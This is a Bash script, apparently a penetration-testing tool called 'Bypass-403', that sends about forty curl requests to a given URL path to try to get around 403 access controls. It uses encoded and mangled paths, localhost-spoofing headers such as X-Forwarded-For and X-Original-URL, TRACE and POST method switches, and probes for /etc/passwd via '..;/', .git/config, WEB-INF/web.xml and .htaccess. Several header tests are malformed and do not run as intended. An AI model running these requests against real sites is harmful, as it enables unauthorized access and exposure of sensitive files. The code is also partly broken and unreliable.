#!/bin/bash

# Function to display banner
show_banner() {
    echo "============================"
    figlet -f standard Bypass-403
    echo "                                                -Loki-404"
    echo "============================"
    echo "Usage: $0 <url> <path> [-w|--no-wayback] [-h|--help]"
}

# Function to display help
show_help() {
    show_banner
    echo
    echo "Options:"
    echo "  -w, --no-wayback   : Skip Wayback Machine URL check"
    echo "  -h, --help         : Show this help message"
    exit 0
}

# Function to perform a test and display results
function test_bypass() {
    local option="$1"
    local header="$2"
    
    result=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$url/$path$option" -H "$header")
    
    echo "  --> Requested URL: $url/$path$option"
    echo "  --> Header: $header"
    echo "  --> Result: $result"
    echo
}

# Main script

# Check if the correct number of arguments is provided
if [ "$#" -lt 2 ]; then
    echo "Error: Invalid number of arguments. Usage: $0 <url> <path> [-w|--no-wayback] [-h|--help]"
    exit 1
fi

url="$1"
path="$2"
show_wayback=true

# Process command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        -w|--no-wayback)
            show_wayback=false
            shift
            ;;
        -h|--help)
            show_help
            ;;
        *)
            shift
            ;;
    esac
done

# Display banner
show_banner

echo "Testing for 403 Bypass on $url/$path"
echo

# Perform tests and display results for each
test_bypass "" ""
test_bypass "/%2e/" ""
test_bypass "/$path/." ""
test_bypass "//$path//" ""
test_bypass "/./$path/./" ""
test_bypass "/$path" "-H X-Original-URL: $path"
test_bypass "/$path" "-H X-Custom-IP-Authorization: 127.0.0.1"
test_bypass "/$path" "-H X-Forwarded-For: http://127.0.0.1"
test_bypass "/$path" "-H X-Forwarded-For: 127.0.0.1:80"
test_bypass "" "-H X-rewrite-url: $path"
test_bypass "/$path%20" ""
test_bypass "/$path%09" ""
test_bypass "/$path?" ""
test_bypass "/$path.html" ""
test_bypass "/$path/?anything" ""
test_bypass "/$path#" ""
test_bypass "/$path" "-H Content-Length:0 -X POST"
test_bypass "/$path/*" ""
test_bypass "/$path.php" ""
test_bypass "/$path.json" ""
test_bypass "/$path" "-X TRACE"
test_bypass "/$path" "-H X-Host: 127.0.0.1"
test_bypass "/$path..;/" ""
test_bypass "/$path;/" ""
test_bypass "" "-X TRACE"
test_bypass "/$path/..;/etc/passwd" ""
test_bypass "/$path/~" ""
test_bypass "/$path/~index.html" ""
test_bypass "/$path/.git/config" ""
test_bypass "/$path/WEB-INF/web.xml" ""
test_bypass "/$path/WEB-INF/" ""
test_bypass "/$path/.svn/entries" ""
test_bypass "/$path/.DS_Store" ""
test_bypass "/$path/%252e" ""
test_bypass "/$path/.%252e" ""
test_bypass "/$path/.%2e" ""
test_bypass "/$path/.%2e%2e" ""
test_bypass "/$path/.%252e%252e" ""
test_bypass "/$path/..../////" ""
test_bypass "/$path/.htaccess" ""
# Additional Test Cases


if [ "$show_wayback" = true ]; then
    echo "Wayback Machine:"
    wayback_result=$(curl -s "https://archive.org/wayback/available?url=$url/$path" | jq -r '.archived_snapshots.closest | {available, url}')
    echo "  --> Requested URL: $url/$path"
    echo "  --> Wayback Machine Result: $wayback_result"
fi
